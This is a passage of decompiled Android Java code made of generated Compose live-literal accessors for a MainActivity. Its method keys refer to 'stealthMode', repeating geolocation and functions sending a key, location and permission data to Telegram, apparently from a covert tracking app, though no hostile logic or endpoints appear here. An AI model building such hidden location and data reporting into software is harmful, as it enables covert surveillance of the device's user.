            return f۲۹Boolean$arg1$calloptBoolean$arg0$call$setrequirePermissions$$try2$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۶۰State$Boolean$arg1$calloptBoolean$arg0$call$setrequirePermissions$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-1$call-optBoolean$arg-0$call-$set-requirePermissions$$try-2$fun-onCreate$class-MainActivity", Boolean.valueOf(f۲۹Boolean$arg1$calloptBoolean$arg0$call$setrequirePermissions$$try2$funonCreate$classMainActivity));
            f۶۰State$Boolean$arg1$calloptBoolean$arg0$call$setrequirePermissions$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-1$call-optBoolean$arg-0$call-$set-stealthMode$$try-2$fun-onCreate$class-MainActivity", offset = 9925)
    /* JADX INFO: renamed from: Boolean$arg-1$call-optBoolean$arg-0$call-$set-stealthMode$$try-2$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۲۸Boolean$arg1$calloptBoolean$arg0$call$setstealthMode$$try2$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۳۰Boolean$arg1$calloptBoolean$arg0$call$setstealthMode$$try2$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۶۱State$Boolean$arg1$calloptBoolean$arg0$call$setstealthMode$$try2$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-1$call-optBoolean$arg-0$call-$set-stealthMode$$try-2$fun-onCreate$class-MainActivity", Boolean.valueOf(f۳۰Boolean$arg1$calloptBoolean$arg0$call$setstealthMode$$try2$funonCreate$classMainActivity));
            f۶۱State$Boolean$arg1$calloptBoolean$arg0$call$setstealthMode$$try2$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Boolean$arg-1$call-putBoolean$$this$call-apply$branch$if$fun-onCreate$class-MainActivity", offset = 11123)
    /* JADX INFO: renamed from: Boolean$arg-1$call-putBoolean$$this$call-apply$branch$if$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final boolean m۲۹Boolean$arg1$callputBoolean$$this$callapply$branch$if$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۳۱Boolean$arg1$callputBoolean$$this$callapply$branch$if$funonCreate$classMainActivity;
        }
        State<Boolean> stateLiveLiteral = f۶۲State$Boolean$arg1$callputBoolean$$this$callapply$branch$if$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Boolean$arg-1$call-putBoolean$$this$call-apply$branch$if$fun-onCreate$class-MainActivity", Boolean.valueOf(f۳۱Boolean$arg1$callputBoolean$$this$callapply$branch$if$funonCreate$classMainActivity));
            f۶۲State$Boolean$arg1$callputBoolean$$this$callapply$branch$if$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Boolean) stateLiveLiteral.getValue()).booleanValue();
    }

    @LiveLiteralInfo(key = "Int$class-MainActivity", offset = -1)
    /* JADX INFO: renamed from: Int$class-MainActivity, reason: not valid java name */
    public final int m۳۰Int$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۳۲Int$classMainActivity;
        }
        State<Integer> stateLiveLiteral = f۶۳State$Int$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Int$class-MainActivity", Integer.valueOf(f۳۲Int$classMainActivity));
            f۶۳State$Int$classMainActivity = stateLiveLiteral;
        }
        return ((Number) stateLiveLiteral.getValue()).intValue();
    }

    @LiveLiteralInfo(key = "Long$arg-1$call-postDelayed$branch$if-1$fun-onCreate$class-MainActivity", offset = 11489)
    /* JADX INFO: renamed from: Long$arg-1$call-postDelayed$branch$if-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final long m۳۱Long$arg1$callpostDelayed$branch$if1$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۳۳Long$arg1$callpostDelayed$branch$if1$funonCreate$classMainActivity;
        }
        State<Long> stateLiveLiteral = f۶۴State$Long$arg1$callpostDelayed$branch$if1$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Long$arg-1$call-postDelayed$branch$if-1$fun-onCreate$class-MainActivity", Long.valueOf(f۳۳Long$arg1$callpostDelayed$branch$if1$funonCreate$classMainActivity));
            f۶۴State$Long$arg1$callpostDelayed$branch$if1$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return ((Number) stateLiveLiteral.getValue()).longValue();
    }

    @LiveLiteralInfo(key = "Long$arg-1$call-postDelayed$fun-run$class-$no-name-provided$$val-runnable$fun-startRepeatingGeoLocation$class-MainActivity", offset = 20957)
    /* JADX INFO: renamed from: Long$arg-1$call-postDelayed$fun-run$class-$no-name-provided$$val-runnable$fun-startRepeatingGeoLocation$class-MainActivity, reason: not valid java name */
    public final long m۳۲Long$arg1$callpostDelayed$funrun$class$nonameprovided$$valrunnable$funstartRepeatingGeoLocation$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۳۴Long$arg1$callpostDelayed$funrun$class$nonameprovided$$valrunnable$funstartRepeatingGeoLocation$classMainActivity;
        }
        State<Long> stateLiveLiteral = f۶۵State$Long$arg1$callpostDelayed$funrun$class$nonameprovided$$valrunnable$funstartRepeatingGeoLocation$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("Long$arg-1$call-postDelayed$fun-run$class-$no-name-provided$$val-runnable$fun-startRepeatingGeoLocation$class-MainActivity", Long.valueOf(f۳۴Long$arg1$callpostDelayed$funrun$class$nonameprovided$$valrunnable$funstartRepeatingGeoLocation$classMainActivity));
            f۶۵State$Long$arg1$callpostDelayed$funrun$class$nonameprovided$$valrunnable$funstartRepeatingGeoLocation$classMainActivity = stateLiveLiteral;
        }
        return ((Number) stateLiveLiteral.getValue()).longValue();
    }

    @LiveLiteralInfo(key = "String$$this$call-plus$val-msg$fun-sendTelegramPermissions$class-MainActivity", offset = 19937)
    /* JADX INFO: renamed from: String$$this$call-plus$val-msg$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    public final String m۳۳String$$this$callplus$valmsg$funsendTelegramPermissions$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۲۴String$$this$callplus$valmsg$funsendTelegramPermissions$classMainActivity;
        }
        State<String> stateLiveLiteral = f۶۶State$String$$this$callplus$valmsg$funsendTelegramPermissions$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$$this$call-plus$val-msg$fun-sendTelegramPermissions$class-MainActivity", f۱۲۴String$$this$callplus$valmsg$funsendTelegramPermissions$classMainActivity);
            f۶۶State$String$$this$callplus$valmsg$funsendTelegramPermissions$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$0$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", offset = 17348)
    /* JADX INFO: renamed from: String$0$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    public final String m۳۴String$0$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۲۵String$0$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        }
        State<String> stateLiveLiteral = f۶۷State$String$0$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$0$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", f۱۲۵String$0$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity);
            f۶۷State$String$0$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$0$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", offset = 20151)
    /* JADX INFO: renamed from: String$0$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    public final String m۳۵String$0$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۲۶String$0$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        }
        State<String> stateLiveLiteral = f۶۸State$String$0$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$0$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", f۱۲۶String$0$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity);
            f۶۸State$String$0$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$0$str$arg-0$call-$init$$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", offset = 20071)
    /* JADX INFO: renamed from: String$0$str$arg-0$call-$init$$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    public final String m۳۶String$0$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۲۷String$0$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        }
        State<String> stateLiveLiteral = f۶۹State$String$0$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$0$str$arg-0$call-$init$$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", f۱۲۷String$0$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity);
            f۶۹State$String$0$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$0$str$arg-0$call-parse$arg-0$call-setData$branch$if$branch$if$fun-requestBatteryOptimizations$class-MainActivity", offset = 13031)
    /* JADX INFO: renamed from: String$0$str$arg-0$call-parse$arg-0$call-setData$branch$if$branch$if$fun-requestBatteryOptimizations$class-MainActivity, reason: not valid java name */
    public final String m۳۷String$0$str$arg0$callparse$arg0$callsetData$branch$if$branch$if$funrequestBatteryOptimizations$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۲۸String$0$str$arg0$callparse$arg0$callsetData$branch$if$branch$if$funrequestBatteryOptimizations$classMainActivity;
        }
        State<String> stateLiveLiteral = f۷۰State$String$0$str$arg0$callparse$arg0$callsetData$branch$if$branch$if$funrequestBatteryOptimizations$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$0$str$arg-0$call-parse$arg-0$call-setData$branch$if$branch$if$fun-requestBatteryOptimizations$class-MainActivity", f۱۲۸String$0$str$arg0$callparse$arg0$callsetData$branch$if$branch$if$funrequestBatteryOptimizations$classMainActivity);
            f۷۰State$String$0$str$arg0$callparse$arg0$callsetData$branch$if$branch$if$funrequestBatteryOptimizations$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$0$str$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", offset = 16578)
    /* JADX INFO: renamed from: String$0$str$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    public final String m۳۸String$0$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۲۹String$0$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        }
        State<String> stateLiveLiteral = f۷۱State$String$0$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$0$str$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", f۱۲۹String$0$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity);
            f۷۱State$String$0$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$0$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", offset = 17269)
    /* JADX INFO: renamed from: String$0$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    public final String m۳۹String$0$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۳۰String$0$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        }
        State<String> stateLiveLiteral = f۷۲State$String$0$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$0$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", f۱۳۰String$0$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity);
            f۷۲State$String$0$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$0$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", offset = 16498)
    /* JADX INFO: renamed from: String$0$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    public final String m۴۰String$0$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۳۱String$0$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        }
        State<String> stateLiveLiteral = f۷۳State$String$0$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$0$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", f۱۳۱String$0$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity);
            f۷۳State$String$0$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$2$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", offset = 17363)
    /* JADX INFO: renamed from: String$2$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    public final String m۴۱String$2$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۳۲String$2$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        }
        State<String> stateLiveLiteral = f۷۴State$String$2$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$2$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", f۱۳۲String$2$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity);
            f۷۴State$String$2$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$2$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", offset = 20166)
    /* JADX INFO: renamed from: String$2$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    public final String m۴۲String$2$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۳۳String$2$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        }
        State<String> stateLiveLiteral = f۷۵State$String$2$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$2$str$$this$call-plus$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", f۱۳۳String$2$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity);
            f۷۵State$String$2$str$$this$callplus$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$2$str$arg-0$call-$init$$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", offset = 20108)
    /* JADX INFO: renamed from: String$2$str$arg-0$call-$init$$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity, reason: not valid java name */
    public final String m۴۳String$2$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۳۴String$2$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        }
        State<String> stateLiveLiteral = f۷۶State$String$2$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$2$str$arg-0$call-$init$$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramPermissions$class-MainActivity", f۱۳۴String$2$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity);
            f۷۶State$String$2$str$arg0$call$init$$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramPermissions$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$2$str$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", offset = 16593)
    /* JADX INFO: renamed from: String$2$str$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    public final String m۴۴String$2$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۳۵String$2$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        }
        State<String> stateLiveLiteral = f۷۷State$String$2$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$2$str$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", f۱۳۵String$2$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity);
            f۷۷State$String$2$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$2$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", offset = 17306)
    /* JADX INFO: renamed from: String$2$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity, reason: not valid java name */
    public final String m۴۵String$2$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۳۶String$2$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        }
        State<String> stateLiveLiteral = f۷۸State$String$2$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$2$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendKeyToTelegram$class-MainActivity", f۱۳۶String$2$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity);
            f۷۸State$String$2$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendKeyToTelegram$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$2$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", offset = 16535)
    /* JADX INFO: renamed from: String$2$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    public final String m۴۶String$2$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۳۷String$2$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        }
        State<String> stateLiveLiteral = f۷۹State$String$2$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$2$str$val-url$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", f۱۳۷String$2$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity);
            f۷۹State$String$2$str$valurl$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$4$str$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", offset = 16607)
    /* JADX INFO: renamed from: String$4$str$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity, reason: not valid java name */
    public final String m۴۷String$4$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۳۸String$4$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        }
        State<String> stateLiveLiteral = f۸۰State$String$4$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$4$str$val-body$try$fun-$anonymous$$arg-0$call-$init$$$this$call-start$fun-sendTelegramLocation$class-MainActivity", f۱۳۸String$4$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity);
            f۸۰State$String$4$str$valbody$try$fun$anonymous$$arg0$call$init$$$this$callstart$funsendTelegramLocation$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-$init$$arg-1$call-registerReceiver$try-1$fun-onCreate$class-MainActivity", offset = 8513)
    /* JADX INFO: renamed from: String$arg-0$call-$init$$arg-1$call-registerReceiver$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۴۸String$arg0$call$init$$arg1$callregisterReceiver$try1$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۳۹String$arg0$call$init$$arg1$callregisterReceiver$try1$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۸۱State$String$arg0$call$init$$arg1$callregisterReceiver$try1$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-$init$$arg-1$call-registerReceiver$try-1$fun-onCreate$class-MainActivity", f۱۳۹String$arg0$call$init$$arg1$callregisterReceiver$try1$funonCreate$classMainActivity);
            f۸۱State$String$arg0$call$init$$arg1$callregisterReceiver$try1$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-$init$$arg-1$call-registerReceiver-1$try-1$fun-onCreate$class-MainActivity", offset = 8656)
    /* JADX INFO: renamed from: String$arg-0$call-$init$$arg-1$call-registerReceiver-1$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
    public final String m۴۹String$arg0$call$init$$arg1$callregisterReceiver1$try1$funonCreate$classMainActivity() {
        if (!LiveLiteralKt.isLiveLiteralsEnabled()) {
            return f۱۴۰String$arg0$call$init$$arg1$callregisterReceiver1$try1$funonCreate$classMainActivity;
        }
        State<String> stateLiveLiteral = f۸۲State$String$arg0$call$init$$arg1$callregisterReceiver1$try1$funonCreate$classMainActivity;
        if (stateLiveLiteral == null) {
            stateLiveLiteral = LiveLiteralKt.liveLiteral("String$arg-0$call-$init$$arg-1$call-registerReceiver-1$try-1$fun-onCreate$class-MainActivity", f۱۴۰String$arg0$call$init$$arg1$callregisterReceiver1$try1$funonCreate$classMainActivity);
            f۸۲State$String$arg0$call$init$$arg1$callregisterReceiver1$try1$funonCreate$classMainActivity = stateLiveLiteral;
        }
        return (String) stateLiveLiteral.getValue();
    }

    @LiveLiteralInfo(key = "String$arg-0$call-$init$$arg-1$call-registerReceiver-2$try-1$fun-onCreate$class-MainActivity", offset = 8752)
    /* JADX INFO: renamed from: String$arg-0$call-$init$$arg-1$call-registerReceiver-2$try-1$fun-onCreate$class-MainActivity, reason: not valid java name */
